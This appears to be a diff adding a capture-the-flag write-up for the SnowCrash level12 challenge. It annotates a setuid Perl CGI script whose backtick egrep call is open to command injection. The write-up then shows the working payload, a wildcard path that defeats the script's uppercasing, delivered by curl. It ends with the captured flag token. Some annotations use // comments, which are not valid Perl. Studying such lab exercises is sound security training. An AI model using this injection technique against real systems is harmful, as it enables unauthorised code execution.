@@ -1,0 +1,57 @@
+1/ level12@SnowCrash:~$ ls -la
+total 16
+dr-xr-x---+ 1 level12 level12  120 Mar  5  2016 .
+d--x--x--x  1 root    users    340 Aug 30  2015 ..
+-r-x------  1 level12 level12  220 Apr  3  2012 .bash_logout
+-r-x------  1 level12 level12 3518 Aug 30  2015 .bashrc
+-rwsr-sr-x+ 1 flag12  level12  464 Mar  5  2016 level12.pl
+-r-x------  1 level12 level12  675 Apr  3  2012 .profile
+
+level12@SnowCrash:~$ perl level12.pl 
+Content-type: text/html
+
+..
+
+2/level12@SnowCrash:~$ cat level12.pl 
+#!/usr/bin/env perl
+# localhost:4646
+use CGI qw{param};
+print "Content-type: text/html\n\n";
+
+sub t {
+  $nn = $_[1];
+  $xx = $_[0];
+  $xx =~ tr/a-z/A-Z/; 	// converts all lowercase letters in $xx to uppercase letters.
+  $xx =~ s/\s.*//;		// removes all characters after the first whitespace character in $xx
+  @output = `egrep "^$xx" /tmp/xd 2>&1`;	//  runs the egrep command on the file /tmp/xd, searching for lines that start with $xx. The output of the command is captured in the array @output. The 2>&1 part redirects any error messages from the egrep command to the standard output, so they are also captured in @output.
+  foreach $line (@output) {
+      ($f, $s) = split(/:/, $line);
+      if($s =~ $nn) {	//  checks if the second part of the line ($s) matches the regular expression $nn
+          return 1;
+      }
+  }
+  return 0;
+}
+
+sub n {
+  if($_[0] == 1) {
+      print("..");
+  } else {
+      print(".");
+  }    
+}
+
+n(t(param("x"), param("y")));
+
+3/ EXPLOIT:
+The situation is similar to level04 -> make use of cgi - call request with parameters x + y
+
+The script defines a subroutine "t" that takes two parameters "x" and "y". It converts x to uppercase letters and removes any spaces and characters after the first space. It then searches for lines in a file "/tmp/xd" that start with the pattern specified by "x" and contain the pattern specified by "y". If such a line is found, it returns 1, otherwise it returns 0.
+level12@SnowCrash:~$ echo 'echo `getflag` > /tmp/myflag' > /tmp/GETFLAG
+level12@SnowCrash:~$ cat /tmp/GETFLAG
+echo `getflag` > /tmp/myflag
+level12@SnowCrash:~$ chmod +x /tmp/GETFLAG
+level12@SnowCrash:~$ curl 'localhost:4646/level12.pl?x=`/*/GETFLAG`'
+..
+level12@SnowCrash:~$ cat /tmp/myflag
+Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
